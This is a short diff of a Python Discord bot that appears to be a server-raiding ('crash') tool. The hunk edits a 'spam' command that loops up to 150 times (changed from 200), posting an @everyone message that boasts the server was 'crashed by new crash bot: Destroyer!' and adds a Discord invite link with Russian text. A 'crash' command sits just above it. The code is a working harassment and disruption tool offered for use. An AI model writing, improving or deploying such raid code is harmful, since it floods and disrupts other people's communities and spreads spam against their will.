@@ -154,9 +154,9 @@ async def crash(ctx):
 
 @client.command(aliases=['spam'])
 async def __spam(ctx):
-  for i in range(200):
+  for i in range(150):
     try:
-      await ctx.send('@everyone S3rv3r crash9d by new ChaosBOT!\n\Ссылка на сервер: https://discord.gg/43GtxcFXPK')
+      await ctx.send('@everyone S3rv3r crash9d by new crash bot: Destroyer!\n\Ссылка на сервер: https://discord.gg/43GtxcFXPK')
     except:
        break
 
